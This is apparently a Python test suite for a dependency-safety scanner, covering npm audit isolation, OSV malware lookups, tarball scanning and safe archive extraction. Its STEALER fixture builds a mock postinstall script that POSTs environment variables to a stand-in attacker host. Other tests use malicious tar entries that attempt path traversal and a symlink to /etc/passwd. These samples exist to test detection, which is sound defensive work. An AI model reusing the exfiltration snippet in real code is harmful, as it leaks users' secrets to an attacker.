import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
from pathlib import Path

from tests._path import ROOT
from tests.fixture_factory import CP, EVIL, PENV, FixtureDir, J, b64

from csr_lib import registry
from csr_lib.model import Severity
import check_deps  # scripts/check_deps.py


def _tgz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in files.items():
            data = content.encode()
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


STEALER = J("const h = Buffer.from('", b64(J("https://", EVIL, "/c")), "', 'base64').toString();\n",
            "require('htt", "ps').request(h, { method: 'POST' }).end(JSON.stringify(", PENV, "));\n")


class FakeRunner:
    def __init__(self, npm=True, audit=None, audit_rc=0, npm_version="11.13.0", pack_files=None):
        self.calls = []
        self.npm = npm
        self.audit = audit if audit is not None else {"auditReportVersion": 2, "vulnerabilities": {},
                                                      "metadata": {"vulnerabilities": {"info": 0, "low": 0,
                                                                   "moderate": 0, "high": 0, "critical": 0}}}
        self.audit_rc = audit_rc
        self.npm_version = npm_version
        self.pack_files = pack_files or {"package/package.json": '{"name":"x","version":"1.0.0"}'}

    def which(self, name):
        return "/usr/bin/npm" if (name == "npm" and self.npm) else None

    def run(self, cmd, cwd, env, timeout=120):
        self.calls.append((list(cmd), Path(cwd), dict(env)))
        sub = cmd[1] if len(cmd) > 1 else ""
        if "--version" in cmd:
            return subprocess.CompletedProcess(cmd, 0, self.npm_version + "\n", "")
        if sub == "audit":
            return subprocess.CompletedProcess(cmd, self.audit_rc, json.dumps(self.audit), "")
        if sub == "install":
            Path(cwd, "package-lock.json").write_text('{"lockfileVersion":3,"packages":{}}')
            return subprocess.CompletedProcess(cmd, 0, "", "")
        if sub == "pack":
            dest = Path(cmd[cmd.index("--pack-destination") + 1])
            dest.mkdir(parents=True, exist_ok=True)
            spec = cmd[2]
            fn = spec.replace("@", "-").lstrip("-").replace("/", "-") + ".tgz"
            (dest / fn).write_bytes(_tgz(self.pack_files))
            return subprocess.CompletedProcess(cmd, 0, json.dumps([{"filename": fn}]), "")
        return subprocess.CompletedProcess(cmd, 1, "", "unknown")


class FakeHttp:
    def __init__(self, osv=None, packuments=None, downloads=None, fail_get=False):
        self.calls = []
        self.osv = osv or {}
        self.packuments = packuments or {}
        self.downloads = downloads or {}
        self.fail_get = fail_get

    def post_json(self, url, body, timeout=30):
        self.calls.append(("POST", url, json.dumps(body)))
        results = []
        for q in body["queries"]:
            ids = self.osv.get(q["package"]["name"], [])
            results.append({"vulns": [{"id": i} for i in ids]} if ids else {})
        return {"results": results}

    def get_json(self, url, timeout=30):
        self.calls.append(("GET", url, ""))
        if self.fail_get:
            import urllib.error
            raise urllib.error.URLError("network unreachable")
        if "api.osv.dev/v1/vulns/" in url:
            vid = url.rsplit("/", 1)[-1]
            return {"id": vid, "summary": f"summary of {vid}"}
        for name, doc in self.packuments.items():
            if url.endswith("/" + name.replace("/", "%2f")) or url.endswith("/" + name.replace("/", "%2F")):
                return doc
        raise OSError("404")

    def download(self, url, dest, max_bytes=50_000_000):
        self.calls.append(("DOWNLOAD", url, ""))
        if url in self.downloads:
            Path(dest).parent.mkdir(parents=True, exist_ok=True)
            Path(dest).write_bytes(self.downloads[url])
            return Path(dest)
        raise OSError("not in fake")


def packument(name, created="2020-01-01T00:00:00.000Z", versions=("1.0.0",), scripts=None):
    vers = {v: {"name": name, "version": v, "scripts": scripts or {}, "dependencies": {},
                "_npmUser": {"name": "alice"}, "maintainers": [{"name": "alice"}],
                "dist": {"tarball": f"https://registry.npmjs.org/{name}/-/{name}-{v}.tgz"}} for v in versions}
    t = {"created": created, "modified": created}
    t.update({v: created for v in versions})
    return {"name": name, "versions": vers, "time": t, "maintainers": [{"name": "alice"}],
            "dist-tags": {"latest": versions[-1]}}


class RegistryTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.scratch = Path(self.tmp.name) / "scratch"
        self.out = Path(self.tmp.name) / "deps.json"

    def tearDown(self):
        self.tmp.cleanup()

    def run_deps(self, root, runner, http, **kw):
        data = check_deps.run(root, self.scratch, offline=kw.get("offline", False), max_deep=kw.get("max_deep", 25),
                              max_bytes=5_000_000, runner=runner, http=http)
        return data

    def test_npm_audit_runs_in_scratch_not_repo(self):
        with FixtureDir("npm-postinstall") as root:
            r = FakeRunner()
            self.run_deps(root, r, FakeHttp())
            npm_calls = [c for c in r.calls if Path(c[0][0]).name == "npm" or c[0][0] == "npm"]
            self.assertTrue(npm_calls)
            for cmd, cwd, env in npm_calls:
                self.assertTrue(str(cwd).startswith(str(self.scratch)), cwd)
                self.assertEqual(env.get("NPM_CONFIG_IGNORE_SCRIPTS"), "true")
                self.assertNotIn(str(root), json.dumps(env))
            self.assertTrue(any(c[0][1] == "audit" for c in npm_calls))

    def test_git_deps_stripped_before_lock(self):
        with FixtureDir("npm-postinstall") as root:
            data = self.run_deps(root, FakeRunner(), FakeHttp())
            copied = json.loads((self.scratch / "npm-audit" / "root" / "package.json").read_text())
            self.assertNotIn("helper", copied.get("dependencies", {}))
            self.assertEqual(copied.get("scripts"), {})
            lock = json.loads((self.scratch / "npm-audit" / "root" / "package-lock.json").read_text())
            self.assertNotIn("node_modules/helper", lock["packages"])
            self.assertIn("helper", [x["name"] for x in data["coverage"]["not_audited"]])

    def test_audit_nonzero_exit_parsed(self):
        audit = {"auditReportVersion": 2, "vulnerabilities": {"lodash": {
            "name": "lodash", "severity": "high", "range": "<4.17.21",
            "via": [{"name": "lodash", "title": "Prototype Pollution", "url": "https://github.com/advisories/GHSA-x",
                     "severity": "high", "range": "<4.17.21"}]}},
            "metadata": {"vulnerabilities": {"info": 0, "low": 0, "moderate": 0, "high": 1, "critical": 0}}}
        with FixtureDir("clean-node-app") as root:
            data = self.run_deps(root, FakeRunner(audit=audit, audit_rc=1), FakeHttp())
            self.assertTrue(data["npm_audit"]["ran"])
            self.assertEqual(data["npm_audit"]["counts"]["high"], 1)
            self.assertEqual(data["npm_audit"]["advisories"][0]["title"], "Prototype Pollution")
            self.assertFalse([f for f in data["findings"] if f["severity"] in ("HIGH", "CRITICAL")])

    def test_osv_mal_is_critical(self):
        with FixtureDir("npm-postinstall") as root:
            http = FakeHttp(osv={"plain-crypto-js": ["MAL-2025-1"]},
                            packuments={"plain-crypto-js": packument("plain-crypto-js", versions=("4.2.1",))})
            data = self.run_deps(root, FakeRunner(), http)
            mal = [f for f in data["findings"] if f["rule_id"] == "DEP-MALWARE-ADVISORY"]
            self.assertEqual(mal[0]["severity"], "CRITICAL")
            self.assertTrue(data["osv"]["vulns"][0]["malicious"])

    def test_cve_does_not_create_finding(self):
        with FixtureDir("clean-node-app") as root:
            data = self.run_deps(root, FakeRunner(), FakeHttp(osv={"express": ["GHSA-aaaa-bbbb-cccc"]}))
            self.assertEqual(data["osv"]["vulns"][0]["id"], "GHSA-aaaa-bbbb-cccc")
            self.assertFalse([f for f in data["findings"] if f["severity"] in ("MEDIUM", "HIGH", "CRITICAL")])

    def test_deep_audit_tarball_scanned(self):
        with FixtureDir("npm-postinstall") as root:
            pack = {"package/package.json": json.dumps({"name": "plain-crypto-js", "version": "4.2.1",
                                                        "scripts": {"postinstall": "node setup.js"}}),
                    "package/setup.js": STEALER}
            http = FakeHttp(packuments={"plain-crypto-js": packument(
                "plain-crypto-js", created="2099-01-01T00:00:00.000Z", versions=("4.2.1",),
                scripts={"postinstall": "node setup.js"})})
            http.downloads["https://registry.npmjs.org/plain-crypto-js/-/plain-crypto-js-4.2.1.tgz"] = _tgz(pack)
            r = FakeRunner(pack_files=pack)
            data = self.run_deps(root, r, http)
            self.assertFalse([c for c in r.calls if "pack" in c[0]], "npm pack must not be used")
            da = [d for d in data["deep_audits"] if d["name"] == "plain-crypto-js"][0]
            self.assertTrue(any(f["severity"] == "CRITICAL" for f in da["scan_findings"]))
            inst = [f for f in data["findings"] if f["rule_id"] == "DEP-INSTALL-SCRIPT" and "plain-crypto-js" in f["title"]]
            self.assertEqual(inst[0]["severity"], "CRITICAL")
            self.assertIn("versions<=3", da["red_flags"])

    def test_safe_extract_rejects_traversal(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            ti = tarfile.TarInfo("../evil.txt")
            ti.size = 1
            tf.addfile(ti, io.BytesIO(b"x"))
        arc = Path(self.tmp.name) / "a.tgz"
        arc.write_bytes(buf.getvalue())
        dest = Path(self.tmp.name) / "x"
        with self.assertRaises(ValueError):
            registry.safe_extract(arc, dest)
        self.assertFalse((Path(self.tmp.name) / "evil.txt").exists())
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            ti = tarfile.TarInfo("package/link")
            ti.type = tarfile.SYMTYPE
            ti.linkname = "/etc/passwd"
            tf.addfile(ti)
        arc.write_bytes(buf.getvalue())
        with self.assertRaises(ValueError):
            registry.safe_extract(arc, Path(self.tmp.name) / "y")

    def test_max_deep_cap(self):
        root = Path(self.tmp.name) / "repo"
        root.mkdir()
        pk = {"": {"name": "r"}}
        for i in range(30):
            pk[f"node_modules/pkg-{i}"] = {"version": "1.0.0", "hasInstallScript": True,
                                           "resolved": f"https://registry.npmjs.org/pkg-{i}/-/pkg-{i}-1.0.0.tgz",
                                           "integrity": "sha512-x"}
        (root / "package.json").write_text('{"name":"r"}')
        (root / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": pk}))
        data = self.run_deps(root, FakeRunner(), FakeHttp(), max_deep=25)
        self.assertEqual(len(data["deep_audits"]), 25)
        self.assertEqual(len([x for x in data["coverage"]["not_audited"] if x["reason"] == "max-deep"]), 5)

    def test_no_npm_degrades(self):
        with FixtureDir("clean-node-app") as root:
            data = self.run_deps(root, FakeRunner(npm=False), FakeHttp())
            self.assertFalse(data["npm_audit"]["ran"])
            self.assertEqual(data["npm_audit"]["reason"], "npm not found")

    def test_offline_skips_network(self):
        with FixtureDir("npm-postinstall") as root:
            http, r = FakeHttp(), FakeRunner()
            data = self.run_deps(root, r, http, offline=True)
            self.assertEqual(http.calls, [])
            self.assertEqual(r.calls, [])
            self.assertFalse(data["osv"]["ran"])
            self.assertEqual(data["osv"]["reason"], "offline")

    def test_private_never_queried(self):
        root = Path(self.tmp.name) / "repo"
        root.mkdir()
        (root / ".npmrc").write_text("@acme:registry=https://npm.acme.example.invalid/\n")
        (root / "package.json").write_text('{"name":"r","dependencies":{"@acme/core":"1.2.3","zod":"3.23.8"}}')
        http, r = FakeHttp(), FakeRunner()
        self.run_deps(root, r, http)
        self.assertFalse([c for c in http.calls if "acme" in c[1] or "acme" in c[2]])
        copied = json.loads((self.scratch / "npm-audit" / "root" / "package.json").read_text())
        self.assertNotIn("@acme/core", copied.get("dependencies", {}))

    def test_cli_exit_zero(self):
        with FixtureDir("clean-python-app") as root:
            r = subprocess.run([sys.executable, "-I", str(ROOT / "scripts" / "check_deps.py"), str(root),
                                "--json", str(self.out), "--offline", "--scratch", str(self.scratch)],
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)
            data = json.loads(self.out.read_text())
            self.assertEqual(data["tool"], "code-safety-review/check-deps")
            self.assertTrue(any(p["name"] == "requests" for p in data["packages"]))


@unittest.skipUnless(os.environ.get("CSR_LIVE") == "1", "set CSR_LIVE=1 for live network smoke test")
class LiveSmoke(unittest.TestCase):
    def test_live_clean_node_app(self):
        with FixtureDir("clean-node-app") as root, tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.json"
            r = subprocess.run([sys.executable, "-I", str(ROOT / "scripts" / "check_deps.py"), str(root),
                                "--json", str(out), "--scratch", str(Path(tmp) / "s")],
                               capture_output=True, text=True, timeout=600)
            self.assertEqual(r.returncode, 0, r.stderr)
            data = json.loads(out.read_text())
            self.assertTrue(data["osv"]["ran"], data["osv"])
            if shutil.which("npm"):
                self.assertTrue(data["npm_audit"]["ran"], data["npm_audit"])


if __name__ == "__main__":
    unittest.main()
